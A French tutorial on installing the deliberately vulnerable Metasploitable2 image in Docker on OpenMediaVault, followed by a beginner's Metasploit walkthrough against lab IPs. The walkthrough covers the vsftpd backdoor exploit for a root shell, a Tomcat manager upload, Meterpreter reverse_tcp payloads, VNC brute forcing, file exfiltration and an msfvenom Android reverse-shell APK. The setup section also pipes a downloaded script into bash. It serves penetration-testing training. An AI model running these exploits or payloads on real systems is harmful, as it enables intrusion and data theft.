
# METASPLOITABLE2 <span style="color: orange">Installation et Tutoriel</span>

## <span style="color: green">Tutoriel d’Installation Propre, Démarrage, Arrêt et Recherche de l’IP de Metasploitable2 sur OpenMediaVault</span>

Ce tutoriel vous guide pour installer proprement **Metasploitable2** sur un serveur OpenMediaVault (OMV) avec Docker, démarrer et arrêter le conteneur, et trouver son adresse IP. 

Conçu pour un environnement NAS comme OMV, ce guide intègre des solutions pour maintenir le conteneur en exécution. Les étapes sont détaillées pour être suivies facilement, avec des commandes précises et des explications.<br>

## Racourcis aprés installations <br>
Les raccourcis expriment de l'aide après installation. : <br>

Utilisateur ROOT : <br>
User : msfadmin <br>
Mot de passe : msfadmin<br>
<br>

Avoir l'ip du contener :<br>
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2<br>

Maper les prots : ( Vous pouvez maper plus de ports que l'exemple ci-dessous! ) <br>
docker run -d --name metasploitable2 -p 10021:21 -p 10022:22 -p 10080:80 -p 10443:443 -p 10023:23 -p 10445:445 -p 13306:3306 -p 15900:5900 tleemcjr/metasploitable2 /bin/bash -c "service ssh start; service apache2 start; tail -f /dev/null"

Testez les services : Depuis votre machine Kali Linux, testez les ports mappés : FTP : ftp <adresse_IP_hôte> 10021 SSH : ssh -p 10022 msfadmin@<adresse_IP_hôte> HTTP : Ouvrez un navigateur ou utilisez curl http://<adresse_IP_hôte>:10080 <br>
Ca fonctionne ici! <br>
ssh -p 10022 -o HostKeyAlgorithms=ssh-rsa -o KexAlgorithms=diffie-hellman-group1-sha1 msfadmin@[TON-IP_LOCAL]

## FIN des Racourcis <br>

## <span style="color: blue">Introduction</span>

Metasploitable2 est une machine virtuelle intentionnellement vulnérable utilisée pour les tests de pénétration. <br>

Ce tutoriel suppose que vous avez un serveur OMV fonctionnel et que vous accédez à son interface via SSH. Nous allons installer Docker, configurer Metasploitable2 pour qu’il reste actif, et expliquer comment le gérer.<br>


## <span style="color: purple">Étape 1 : Préparation et Installation de Docker sur OpenMediaVault</span>

### 1.1 Activer SSH sur OMV

Pour commencer, activez SSH sur votre serveur OMV :

- Accédez à l’interface web d’OMV (par exemple, `http://<adresse_IP_du_serveur>:80`).
- Allez dans **Services > SSH**.
- Activez SSH, laissez le port par défaut (22), et cochez "Permettre la connexion root" si nécessaire.
- Appliquez les modifications.

### 1.2 Installer OMV-Extras

Ensuite, installez OMV-Extras pour ajouter des fonctionnalités comme Docker :

- Connectez-vous au serveur via SSH avec :
  ```bash
  ssh root@<adresse_IP_du_serveur>
  (Remplacez <adresse_IP_du_serveur> par l’IP réelle de votre serveur OMV.)
## Installez OMV-Extras avec cette commande :
bash
wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install | bash
Une fois terminé, actualisez l’interface web d’OMV. Vous verrez un nouveau menu OMV-Extras sous Système.
### 1.3 Installer Docker via OMV-Extras
Docker est nécessaire pour exécuter Metasploitable2 :
Dans l’interface web d’OMV, allez dans OMV-Extras > Docker.
Cliquez sur Installer Docker. L’installation prendra quelques minutes.
Vérifiez que le statut passe à "installé et en cours d’exécution".
### 1.4 (Optionnel) Configurer le Stockage Docker
Par défaut, Docker utilise le système de fichiers racine, ce qui peut être limité sur un NAS. Pour éviter cela :
Créez un dossier partagé dans OMV (par exemple, /srv/dev-disk-by-label/data/docker) via Stockage > Systèmes de fichiers.
Allez dans OMV-Extras > Docker > Paramètres, et définissez ce chemin comme emplacement pour les données Docker.
Appliquez les modifications.
<span style="color: red">Étape 2 : Installation Propre de Metasploitable2</span>
### 2.1 Supprimer toute trace précédente
Si vous avez déjà un conteneur Metasploitable2, supprimez-le pour repartir de zéro :
bash
docker rm -f metasploitable2
### 2.2 Télécharger l’image Metasploitable2
Téléchargez l’image officielle de Metasploitable2 depuis Docker Hub :
bash
docker pull tleemcjr/metasploitable2
Cela télécharge une image d’environ 1,51 Go contenant Metasploitable2.
### 2.3 Créer un réseau Docker personnalisé
Créez un réseau isolé pour vos conteneurs (par exemple, pentest) :
bash
docker network create pentest
Ce réseau permet une communication sécurisée entre Metasploitable2 et d’autres conteneurs (comme Kali Linux pour Metasploit).
### 2.4 Lancer Metasploitable2 avec une configuration persistante
Lancez le conteneur en mode détaché, en vous assurant qu’il reste actif après le démarrage des services :
bash
docker run -d --name metasploitable2 --network pentest tleemcjr/metasploitable2 /bin/bash -c "/etc/rc.local; tail -f /dev/null"
Explications :
-d : Exécute le conteneur en arrière-plan.
--name metasploitable2 : Nomme le conteneur pour une gestion facile.
--network pentest : Connecte le conteneur au réseau personnalisé.
/bin/bash -c "/etc/rc.local; tail -f /dev/null" : Exécute /etc/rc.local pour démarrer les services (Apache, MySQL, etc.), puis maintient le conteneur en vie avec tail -f /dev/null.
<span style="color: teal">Étape 3 : Gestion du Conteneur (Démarrage, Arrêt, IP)</span>
### 3.1 Vérifier que le conteneur est en cours d’exécution
Après avoir lancé le conteneur, vérifiez son état :
bash
docker ps
Vous devriez voir une ligne comme celle-ci :
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS     NAMES
abc123         tleemcjr/metasploitable2   "/bin/bash -c '/etc/rc.local; tail -f /dev/null'"   2 minutes ago   Up 2 minutes             metasploitable2
Si le conteneur n’apparaît pas, utilisez docker ps -a pour voir s’il est arrêté, et passez à l’étape suivante.
### 3.2 Démarrer le conteneur
Si le conteneur est arrêté (par exemple, après un redémarrage du serveur) :
bash
docker start metasploitable2
Vérifiez à nouveau avec docker ps qu’il est en cours d’exécution.
### 3.3 Arrêter le conteneur
Pour arrêter le conteneur proprement :
bash
docker stop metasploitable2
Cela envoie un signal d’arrêt aux processus du conteneur.
### 3.4 Trouver l’adresse IP de Metasploitable2
Pour obtenir l’adresse IP du conteneur :
bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2
Cela retournera une adresse IP, par exemple 172.17.0.3, que vous pouvez utiliser pour interagir avec Metasploitable2 (ex. pour des tests avec Metasploit).
### 3.5 (Optionnel) Supprimer le conteneur
Si vous souhaitez supprimer complètement le conteneur :
bash
docker rm -f metasploitable2
Relancez-le avec la commande de l’étape 2.4 si nécessaire.
<span style="color: gold">Étape 4 : Vérifications et Bonnes Pratiques</span>
### 4.1 Vérifier les ressources
OMV étant un NAS, vérifiez que le conteneur n’épuise pas les ressources :
bash
docker stats metasploitable2
Assurez-vous que votre serveur a au moins 2 Go de RAM disponibles pour éviter des problèmes de performance.
### 4.2 Sécurité
Metasploitable2 est vulnérable par conception :
Ne l’exposez pas à Internet.
Utilisez-le uniquement dans un environnement contrôlé, comme le réseau Docker pentest.
### 4.3 Sauvegarde de la configuration
Notez les commandes utilisées (par exemple, dans un fichier texte) pour recréer facilement votre environnement si nécessaire.
<span style="color: cyan">Résumé des Commandes Clés</span>
Action
Commande
Installer OMV-Extras
`wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install
### Télécharger Metasploitable2
docker pull tleemcjr/metasploitable2
## Créer un réseau Docker
docker network create pentest
## Lancer Metasploitable2
docker run -d --name metasploitable2 --network pentest tleemcjr/metasploitable2 /bin/bash -c "/etc/rc.local; tail -f /dev/null"
## Démarrer le conteneur
docker start metasploitable2
## Arrêter le conteneur
docker stop metasploitable2
## Trouver l’IP
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2
## Vérifier l’état
docker ps
## Supprimer le conteneur
docker rm -f metasploitable2
<span style="color: magenta">Conclusion</span>

Avec ce tutoriel, vous avez une installation propre de Metasploitable2 sur votre serveur OMV. Le conteneur est configuré pour rester actif grâce à tail -f /dev/null, et vous pouvez le démarrer, l’arrêter, et trouver son IP facilement. 
Vous êtes maintenant prêt à utiliser Metasploit pour tester cette cible vulnérable dans un environnement sécurisé. Si vous avez besoin d’aide pour configurer Metasploit ou d’autres étapes, n’hésitez pas à demander !
### <span style="color: lime">Points Clés</span>
Metasploit est un outil puissant pour tester la sécurité des systèmes, mais il doit être utilisé dans un environnement autorisé.
Ce tutoriel inclut des exemples pratiques pour débutants, comme exploiter des vulnérabilités sur une machine virtuelle comme Metasploitable2.
Avec de la pratique, vous pourrez maîtriser les bases comme rechercher des modules et lancer des exploits.
### <span style="color: orange">Introduction à Metasploit</span>
Metasploit est un framework open-source utilisé pour les tests de pénétration, permettant de découvrir et exploiter des vulnérabilités dans les systèmes et réseaux. Il est idéal pour les débutants souhaitant apprendre, mais il est crucial de l’utiliser uniquement sur des systèmes autorisés, comme des machines virtuelles (ex. Metasploitable2 ou 3, disponible sur Metasploit).
Ce tutoriel vous guide pas à pas, avec des exemples concrets, pour vous familiariser avec l’interface, la recherche de modules, la configuration d’options, et l’exécution d’exploits. Une étape inattendue pourrait être l’utilisation de Meterpreter pour des tâches avancées comme la recherche de fichiers sur la cible.
### <span style="color: green">Exemples Pratiques</span>
Voici quelques exemples pour vous aider à démarrer, en supposant que vous utilisez Kali Linux et une machine cible comme Metasploitable2 :
### Lancer Metasploit : Ouvrez un terminal et tapez :
bash
msfconsole
### Rechercher un exploit : Pour trouver un exploit pour vsftpd :
bash
search vsftpd
### Puis sélectionnez :
bash
use exploit/unix/ftp/vsftpd_234_backdoor
### Configurer et lancer : Définissez l’adresse IP de la cible :
bash
set RHOSTS 192.168.74.129
set payload cmd/unix/interact
exploit
### Vérifiez votre accès avec :
bash
whoami
### Cela devrait retourner root.
Ces étapes sont simples à suivre et vous donnent un aperçu pratique de l’outil.
### <span style="color: blue">Note Détaillée</span>
###Contexte et Importance de Metasploit
Metasploit, développé par Rapid7, est un framework open-source essentiel pour les tests de pénétration, utilisé par les analystes en sécurité et les testeurs pour identifier et exploiter des vulnérabilités. Il est particulièrement utile pour simuler des attaques et renforcer la sécurité des systèmes.
Cependant, son utilisation sans autorisation est illégale, ce qui en fait un sujet sensible nécessitant une approche éthique. Les recherches suggèrent que Metasploit est souvent préinstallé sur des distributions comme Kali Linux ou Parrot Security, facilitant son accès pour les utilisateurs. Pour pratiquer en toute sécurité, il est recommandé d’utiliser des machines virtuelles comme Metasploitable2 ou 3, disponibles sur Metasploit. Ces environnements sont conçus pour être vulnérables, offrant un terrain d’apprentissage sans risque.
### Installation et Lancement
Pour commencer, Metasploit peut être lancé via deux méthodes sur Kali Linux :
Via le menu Applications : Allez dans 08 Exploitation Tools > metasploit framework.
Ou directement en terminal avec la commande :
bash
msfconsole
Cela affiche l’interface avec un prompt MSF.
### Il est conseillé de mettre à jour la base de données avec :
bash
db_update
Cela garantit l’accès aux derniers exploits et vulnérabilités (au 19 mars 2025, cela inclut les mises à jour récentes).
Recherche et Sélection de Modules
Metasploit propose une vaste bibliothèque de modules, organisés en catégories comme exploits, payloads, et auxiliaires. La recherche peut être affinée avec des filtres, par exemple :
### Pour des exploits Windows de 2023 :
bash
search cve:2023 type:exploit platform:windows
### Pour des modules Tomcat :
bash
search tomcat
### Une fois un module trouvé, sélectionnez-le avec use, par exemple :
bash
use exploit/multi/http/tomcat_mgr_upload
### Les classements (Excellent, Great, etc.) peuvent guider votre choix.
Configuration des Options
Chaque module a des options spécifiques, affichées avec :
bash
options
### Par exemple, pour un exploit vsftpd :
Configurez l’adresse IP cible :
bash
set RHOSTS 192.168.74.129
Vérifiez avec :
bash
show options
### Cela montre les paramètres comme RPORT (par défaut 21 pour FTP).
### Pour des exploits nécessitant des identifiants, comme Apache Tomcat :
bash
set HttpUsername tomcat
set HttpPassword tomcat
### Même si certains champs sont marqués comme non requis, ils peuvent être essentiels.
Sélection et Configuration des Payloads
### Les payloads définissent ce qui se passe après l’exploitation. Par exemple, pour une shell inverse avec Meterpreter :
Utilisez :
bash
set payload java/meterpreter/reverse_tcp
Configurez :
bash
set LHOST 192.168.74.128
set LPORT 4444
### Vous pouvez lister les payloads disponibles avec :
bash
show payloads
Cela offre des options comme bind/reverse shell ou staged/non-staged (ex. windows/meterpreter/reverse_tcp).
Lancement de l’Exploit et Post-Exploitation
### Lancez l’exploit avec :
bash
exploit
Ou :
bash
run
### Selon le module.
Pour vsftpd :
Après configuration, exploit ouvre une session. Vérifiez avec :
bash
whoami
### Cela devrait retourner root sur Metasploitable2.
Pour des tâches post-exploitation, Meterpreter offre des fonctionnalités avancées :
Rechercher des fichiers :
bash
search -f license.txt
(Trouve 8 fichiers, par exemple.)
### Télécharger un fichier :
bash
download /var/www/tikiwiki-old/license.txt
(Télécharge 23.81 KiB.)
### Accéder à une shell système :
bash
shell
whoami
### Exemples Pratiques Détaillés
## Voici un tableau récapitulatif d’exemples pratiques :
Exemple

Module/Commande

Configuration

Résultat Attendu

Exploiter vsftpd

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 192.168.74.129, exploit

Shell root, whoami retourne root

Scanner Samba et exploiter

use auxiliary/scanner/smb/smb_version, puis use 1

set RHOSTS 192.168.74.129, exploit

### Détecte Samba 3.0.20, accès root

Brute force VNC

use auxiliary/scanner/vnc/vnc_login

set RHOSTS 192.168.74.129, run


### Trouve mot de passe ("password"), accès GUI
Upgrader à Meterpreter

use post/multi/manage/shell_to_meterpreter

set SESSION 4, exploit

### Session Meterpreter, accès avancé
Créer payload Android

msfvenom -p android/meterpreter/reverse_tcp ...

LHOST=192.168.74.128, LPORT=8080, -o payload.apk

Fichier APK généré, 13625 bytes

Création de Payloads Personnalisés

Avec msfvenom, vous pouvez générer des payloads pour différents systèmes. Par exemple, pour Android :

bash

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.74.128 LPORT=8080 -o /root/Desktop/payload.apk

Configurez un handler avec :

bash

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

run

###Cela permet de tester des applications mobiles, une fonctionnalité inattendue pour ceux qui se concentrent uniquement sur les réseaux.
Conseils et Précautions

Pratiquer sur des systèmes autorisés est crucial. Utilisez Metasploitable, téléchargeable sur Rapid7.

# Ne testez jamais sur des systèmes sans permission, car cela peut être illégal.

### Explorez les ressources supplémentaires comme HackTheBox pour des modules de formation, ou StationX pour des guides détaillés.
## <span style="color: purple">Conclusion</span>
Ce tutoriel couvre les bases et des exemples avancés de Metasploit, adaptés aux débutants. En suivant ces étapes, vous devriez être capable de comprendre comment rechercher, configurer, et exploiter des vulnérabilités, tout en explorant des fonctionnalités comme Meterpreter et msfvenom. 

